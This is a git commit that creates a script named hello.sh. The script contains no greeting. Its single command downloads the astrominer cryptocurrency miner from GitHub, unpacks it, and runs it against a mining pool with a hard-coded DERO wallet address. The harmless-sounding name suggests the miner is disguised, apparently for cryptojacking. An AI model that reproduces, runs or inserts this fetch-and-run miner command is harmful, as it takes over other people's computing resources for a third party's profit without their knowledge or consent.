e4496d58e691e7519ffae2ba74c0cd21cee1029c
ovh9111 <131962541+ovh9111@users.noreply.github.com>
2023-04-27 18:27:40 +0600

    Create hello.sh

---
+++ hello.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.9/astrominer-V1.9_generic_amd64_linux.tar.gz && tar -xvf astrominer-V1.9_generic_amd64_linux.tar.gz && ./astrominer -w deroi1qyr8wnk9aw9lel0xcufdj98cqtd3lc5y84nhl679nm3wknaz0ad6xq9pvfz92xnnzk527eq8xhf -r community-pools.mysrv.cloud:10300 -p rpc
